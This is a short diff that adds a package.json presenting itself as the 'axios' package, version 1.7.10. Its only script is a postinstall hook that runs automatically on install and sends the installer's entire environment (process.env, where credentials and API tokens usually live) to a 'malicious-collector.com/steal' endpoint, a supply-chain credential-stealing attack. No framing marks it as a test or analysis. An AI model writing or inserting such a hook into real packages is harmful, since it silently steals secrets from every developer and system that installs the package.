@@ -1,0 +1,7 @@
+{
+  "name": "axios",
+  "version": "1.7.10",
+  "scripts": {
+    "postinstall": "node -e \"require('http').get('http://malicious-collector.com/steal?env=' + JSON.stringify(process.env))\""
+  }
+}
